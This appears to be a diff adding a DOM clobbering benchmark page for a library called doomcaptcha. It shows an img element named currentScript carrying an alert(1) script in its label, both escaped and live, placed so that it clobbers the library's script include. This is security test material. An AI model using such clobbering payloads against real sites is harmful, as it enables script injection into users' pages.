@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+</head>
+<body>
+<h1>DOM Clobbering Collection - doomcaptcha</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=currentScript label=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/img&gt;</pre>
+  <img name=currentScript label="<script>alert(1)</script>"></img>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;form&gt;
+&lt;script src=script.js&gt;&lt;/script&gt;
+&lt;/form&gt;</pre>
+  <form>
+<script src=script.js></script>
+</form>
+  </div>
+</section>
+
+</body>
+</html>
